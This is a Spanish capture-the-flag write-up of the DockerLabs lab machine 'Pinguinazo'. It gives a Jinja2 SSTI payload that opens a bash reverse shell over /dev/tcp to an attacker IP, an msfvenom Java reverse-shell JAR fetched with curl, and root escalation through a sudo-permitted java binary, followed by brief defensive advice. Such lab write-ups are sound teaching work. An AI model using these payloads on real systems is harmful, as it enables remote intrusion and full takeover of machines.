# Pinguinazo — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** El Pingüino de Mario  
**Fecha de creación:** 24/06/2024  
**Técnicas:** SSTI · Reverse Shell · Jinja2 Injection · Java sudo abuse · Privilege Escalation

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Identificación de SSTI](#2-identificación-de-ssti)
3. [Explotación SSTI — Reverse Shell](#3-explotación-ssti--reverse-shell)
4. [Escalada de privilegios — Java sudo](#4-escalada-de-privilegios--java-sudo)
5. [Lección aprendida](#5-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh pinguinazo.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
5000/tcp open upnp
```

El servicio web corre sobre el puerto `5000`.

---

## 2. Identificación de SSTI

Accedemos a la aplicación web.

La página permite introducir datos que posteriormente son renderizados en pantalla.

Probamos una operación básica:

```text
{{7*7}}
```

Resultado:

```text
49
```

La aplicación es vulnerable a **Server-Side Template Injection (SSTI)**.

Referencia utilizada:

[PayloadsAllTheThings — SSTI](https://github.com/cybersnippets/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection?utm_source=chatgpt.com)

---

## 3. Explotación SSTI — Reverse Shell

Generamos una reverse shell Bash.

Nos ponemos en escucha:

```bash
sudo nc -lvnp 443
```

Payload SSTI utilizado:

```jinja2
{{ self.__TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/192.168.1.26/443 0>&1"').read() }}
```

Tras enviarlo obtenemos acceso remoto:

```bash
whoami
pinguinazo
```

---

## 4. Escalada de privilegios — Java sudo

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /usr/bin/java
```

Consultamos una referencia para escalada mediante Java:

[Java Privilege Escalation Guide](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-java-privilege-escalation?utm_source=chatgpt.com)

Generamos un JAR malicioso:

```bash
msfvenom -p java/shell_reverse_tcp LHOST=192.168.1.26 LPORT=4444 -f jar -o shell.jar
```

Compartimos el archivo:

```bash
python3 -m http.server
```

En la máquina víctima descargamos el fichero:

```bash
curl http://192.168.1.26:8000/shell.jar -o /tmp/shell.jar
```

Nos ponemos en escucha:

```bash
nc -lvnp 4444
```

Ejecutamos el JAR como root:

```bash
sudo /usr/bin/java -jar /tmp/shell.jar
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 5. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| SSTI en aplicación web | Ejecución remota de comandos |
| Reverse Shell mediante Jinja2 | Acceso inicial |
| Java ejecutable con sudo | Escalada a root |

**Para defenderse:**

- Sanitizar entradas en motores de plantillas.
- No renderizar contenido controlado por usuarios.
- Restringir binarios peligrosos mediante sudo.
- Auditar aplicaciones Flask/Jinja2 frente a SSTI.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
